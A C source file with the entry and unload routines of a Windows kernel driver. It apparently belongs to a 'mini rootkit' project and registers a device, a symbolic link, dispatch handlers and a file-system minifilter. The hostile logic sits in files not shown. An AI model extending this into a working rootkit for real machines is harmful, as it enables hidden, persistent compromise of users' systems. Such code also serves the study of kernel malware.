#include <fltKernel.h>
#include <ntifs.h>
#include <wdm.h>
// Include minwindef.h after ntifs.h and wdm.h to avoid redefinition errors
#include <minwindef.h>
#include "dispatch.h"
#include "filter.h"
#include "mini_rootkit.h"
#include "structures.h"
#include "utils.h"

_Use_decl_annotations_ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
                                            IN PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status = STATUS_SUCCESS;
    NTSTATUS res;

    MyDbgPrint("Loading driver...");
    DriverObject->DriverUnload = DriverUnload;

    MyDbgPrint("Creating device...");
    res = IoCreateDevice(DriverObject, 0, &DEVICE_NAME, FILE_DEVICE_UNKNOWN,
                         FILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);
    if (!NT_SUCCESS(res)) {
        MyDbgPrint("Failed to create device (error: %d)", res);
        goto ret_fail;
    }

    res = IoCreateSymbolicLink(&DEVICE_LINK, &DEVICE_NAME);
    if (!NT_SUCCESS(res)) {
        MyDbgPrint("Failed to create symbolic link (error: %d)", res);
        goto delete_dev;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchFunction;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchFunction;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchFunction;

    MyDbgPrint("Creating filter...");
    res = FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
    if (!NT_SUCCESS(res)) {
        MyDbgPrint("Failed to register filter (error: %d)", res);
        goto delete_symlink;
    }

    res = FltStartFiltering(gFilterHandle);
    if (!NT_SUCCESS(res)) {
        MyDbgPrint("Failed to start filtering (error: %d)", res);
        goto unreg_filter;
    }

    MyDbgPrint("Loaded");
    goto ret;

unreg_filter:
    if (gFilterHandle) {
        FltUnregisterFilter(gFilterHandle);
        gFilterHandle = NULL;
    }

delete_symlink:
    IoDeleteSymbolicLink(&DEVICE_LINK);

delete_dev:
    IoDeleteDevice(DriverObject->DeviceObject);

ret_fail:
    status = res;

ret:
    return status;
}

_Use_decl_annotations_ VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);

    NTSTATUS res;

    MyDbgPrint("Unloading driver...");

    FilterUnload(FLTFL_FILTER_UNLOAD_MANDATORY);

    MyDbgPrint("Deleting symbolic link...");
    res = IoDeleteSymbolicLink(&DEVICE_LINK);
    if (!NT_SUCCESS(res)) {
        MyDbgPrint("Failed to delete symbolic link (error: %d)", res);
    }

    IoDeleteDevice(DriverObject->DeviceObject);

    MyDbgPrint("Unloaded");
}
